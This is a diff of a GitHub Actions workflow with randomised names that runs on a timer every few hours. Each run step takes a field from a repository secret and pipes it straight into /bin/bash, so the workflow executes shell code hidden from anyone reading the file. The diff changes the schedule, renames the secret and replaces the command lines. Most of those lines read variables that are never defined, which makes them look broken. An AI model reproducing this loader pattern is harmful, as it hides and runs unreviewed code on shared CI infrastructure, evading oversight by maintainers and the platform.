@@ -3,24 +3,20 @@ name: lujingxi3456
 on:
   workflow_dispatch:
   schedule:
-    - cron: '17 2/6 * * *'
+    - cron: '6 5/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: lujingxi3456
         env:
-          vislo6124: ${{ secrets.vislo6124 }}
+          dvp76725: ${{ secrets.dvp76725 }}
         run: |
-          echo $vislo6124 | jq -r .rs1 | /bin/bash
-          echo $y41 | jq -r .txoe67011 | /bin/bash
-          echo $ptg0604 | jq -r .p0052 | /bin/bash
-          echo $zjumc6 | jq -r .bnbr79 | /bin/bash
-          echo $g4499 | jq -r .yuf14071 | /bin/bash
-          echo $mt6008 | jq -r .qwtem527 | /bin/bash
-          echo $hta3197 | jq -r .boqs2 | /bin/bash
-          echo $e654 | jq -r .rlv93181 | /bin/bash
+          echo $dvp76725 | jq -r .jjn8 | /bin/bash
+          echo $gmdbp1 | jq -r .zpv631 | /bin/bash
+          echo $a83231 | jq -r .akldb6655 | /bin/bash
+          echo $xslp660 | jq -r .wc669 | /bin/bash
+          echo $an30 | jq -r .ovph91 | /bin/bash
 
